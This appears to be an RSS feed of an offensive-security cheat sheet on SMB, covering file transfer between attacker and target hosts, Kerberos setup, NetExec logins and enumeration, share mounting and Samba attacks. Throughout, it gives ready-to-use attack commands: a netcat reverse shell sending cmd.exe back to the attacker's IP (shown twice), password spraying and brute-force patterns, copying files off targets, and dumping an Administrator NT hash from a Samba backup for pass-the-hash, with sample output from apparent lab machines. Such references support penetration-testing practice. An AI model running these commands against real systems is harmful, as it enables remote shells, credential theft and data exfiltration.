channel.title: SMB on TLDRBins
channel.description: Recent content in SMB on TLDRBins

item.title: File Transfer (Windows To Linux)
item.description:
Start a Local SMB Server

impacket-smbserver share . -smb2support

cmd

# Connect to SMB server without creds
net use \\<LOCAL_IP>\share

# Connect to SMB server with creds
net use \\<LOCAL_IP>\share /u:<USER> <PASSWORD>

# From target Windows to local Linux
copy <FILE> \\<LOCAL_IP>\share

# From local Linux to target Windows
copy \\<LOCAL_IP>\share\<FILE> <FILE>

# Delete file
del <FILE>

# Remove SMB share
net use /d \\<LOCAL_IP>\share

# Older Windows (e.g. xp), use directly
\\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>

Small Binary

# In target Windows
[System.convert]::ToBase64String((Get-Content -Path 'C:\ProgramData\<FILE>' -Encoding Byte))

# Copy and paste the base64 encoded binary to local Linux
echo -n '<BASE64_BINARY>' | base64 -d > <FILE>

Note: For restricted environment

item.title: File Transfer (Windows To Windows)
item.description:
# Connect to SMB server without creds
net use \\<LOCAL_IP>\share

# Connect to SMB server with server name
net use \\<SERVER_NAME>\share

# Connect to SMB server with creds
net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'

# Mount to a drive with creds
net use X: \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>'

# From local Windows to target Windows
copy <FILE> \\<LOCAL_IP>\share

# From target Windows to local Windows
copy \\<LOCAL_IP>\share\<FILE> <FILE>

# Delete file
del <FILE>

# Remove SMB share
net use /d \\<LOCAL_IP>\share

# Remove drive
net use /d X:

# Older Windows (e.g. xp), use directly
\\<LOCAL_IP>\share\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>

item.title: Kerberos
item.description:
Authentication Method

Kerberos Ticket

1. Configure /etc/hosts

# Always in this order - DC.example.com example.com DC
sudo nxc smb <DC_IP> --generate-hosts-file /etc/hosts

$ sudo nxc smb 10.129.235.149 --generate-hosts-file /etc/hosts
SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
                                                                                                                                                                                                                    
$ tail -n1 /etc/hosts
10.129.235.149     DC.administrator.htb administrator.htb DC

2. Configure /etc/krb5.conf

# Always in UPPERCASE - DC.EXAMPLE.COM
sudo nxc smb <DC_IP> --generate-krb5-file /etc/krb5.conf

$ sudo nxc smb 10.129.235.149 --generate-krb5-file /etc/krb5.conf
SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 

$ cat /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = ADMINISTRATOR.HTB

[realms]
    ADMINISTRATOR.HTB = {
        kdc = dc.administrator.htb
        admin_server = dc.administrator.htb
        default_domain = administrator.htb
    }

[domain_realm]
    .administrator.htb = ADMINISTRATOR.HTB
    administrator.htb = ADMINISTRATOR.HTB

item.title: NetExec (nxc)
item.description:
General

# Single user, Single password
nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>'

# Single user, Single password, Local auth
nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth

# Single user, Single password (Active Directory)
nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>

# Single user, Multiple passwords
nxc <PROTOCOL> <TARGET> -u '<USER>' -p <PASSWORDS> -d <DOMAIN>

# Multiple users, Single password
nxc <PROTOCOL> <TARGET> -u <USERS> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success

# Multiple users, Multiple passwords
nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> -d <DOMAIN> --continue-on-success

# Match username to corresponding password
nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> --no-bruteforce --continue-on-success

# NTLM
nxc <PROTOCOL> <TARGET> -u '<USER>' -H <HASH> -d <DOMAIN>

# Password-based Kerberos
sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC>

# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -H <HASH> -d <DOMAIN> -k --kdcHost <DC>

# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -d <DOMAIN> -k --kdcHost <DC> --use-kcache

item.title: Samba
item.description:
Priesc #1: Retrieve NTLM from Samba Backup

1. Query 'unicodepwd' of Target User

ldbsearch -H sam.ldb '(samaccountname=<USER>)' 'unicodepwd'

$ ldbsearch -H sam.ldb '(samaccountname=Administrator)' 'unicodepwd'
# record 1
dn: CN=Administrator,CN=Users,DC=example,DC=com
unicodePwd:: iEb36u6PsRetBr3YMLdYbA==

# Referral
ref: ldap:///CN=Configuration,DC=example,DC=com

# Referral
ref: ldap:///DC=DomainDnsZones,DC=example,DC=com

# Referral
ref: ldap:///DC=ForestDnsZones,DC=example,DC=com

# returned 4 records
# 1 entries
# 3 referrals

2. Convert to Hex

echo -n '<UNICODEPWD>' | base64 -d | xxd -p   

$ echo -n 'iEb36u6PsRetBr3YMLdYbA==' | base64 -d | xxd -p   
8846f7eaee8fb117ad06bdd830b7586c

3. Pass-The-Hash

smbclient -L \\\\<TARGET>\\ -U '<DOMAIN>/<USER>%<HASH>' --pw-nt-hash

$ smbclient -L \\\\dc.example.com\\ -U 'example.com/Administrator%8846f7eaee8fb117ad06bdd830b7586c' --pw-nt-hash
gensec_gse_client_prepare_ccache: Kinit for Administrator@EXAMPLE.COM to access cifs/dc.example.com failed: Preauthentication failed: NT_STATUS_LOGON_FAILURE

        Sharename       Type      Comment
        ---------       ----      -------
        sysvol          Disk      
        netlogon        Disk      
        home            Disk      Home Directories
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server dc.example.com (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

item.title: Share Mount
item.description:
List Shares

showmount -e <TARGET>

$ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *

Mount Share

sudo mkdir /mnt/share

$ sudo mkdir /mnt/share

sudo mount -t nfs <TARGET>:<SHARE> /mnt/share/

$ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/share/

$ ls /mnt/share 
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

Unmount Share

sudo umount /mnt/share/

$ sudo umount /mnt/share/

Mount Share

sudo mount -t cifs //<TARGET>/<SHARE> /mnt

# Without creds
sudo mount -t cifs -o user=,password= //<TARGET>/<SHARE> /mnt

# With creds
sudo mount -t cifs -o user='<USER>',pass='<PASSWORD>' //<TARGET>/<SHARE> /mnt

$ sudo mount -t cifs -o ro,user='localadmin',password='Secret123' //10.10.11.102/Shared /mnt

$ ls /mnt      
Documents  Software

Mount inside Windows

# Mount
net use \\localhost\c$ /u:'<DOMAIN>\<USER>' '<PASSWORD>'

# Check
dir \\localhost\c$\users\administrator\desktop

item.title: SMB Enum
item.description:
Authentication Method

Enumeration

sudo nmap --script=smb-enum-shares -p 445 <TARGET>

$ sudo nmap --script=smb-enum-shares -p 445 10.10.11.207

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 04:53 GMT
Nmap scan report for 10.10.11.207
Host is up (0.26s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds

item.title: SMB Server
item.description:
Start a SMB Server for File Transfer

impacket-smbserver share . -smb2support

$ impacket-smbserver share . -smb2support
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

impacket-smbserver share . -smb2support -username '<USER>' -password '<PASSWORD>'

$ impacket-smbserver share . -smb2support -username 'test' -password 'test'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

Note: Sometimes smb server with creds may not work
